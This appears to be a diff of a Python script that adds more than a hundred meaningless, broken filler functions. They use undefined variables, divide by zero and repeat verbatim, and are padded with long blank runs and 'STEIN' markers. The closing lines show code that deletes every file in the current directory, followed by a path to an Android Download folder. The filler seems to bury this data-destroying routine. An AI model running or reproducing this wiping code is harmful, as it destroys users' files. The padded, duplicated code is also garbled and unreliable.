+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     for filename in os.listdir('.'):
         if os.path.isfile(filename): os.remove(filename)
     folder_path = '/storage/emulated/0/Download/'
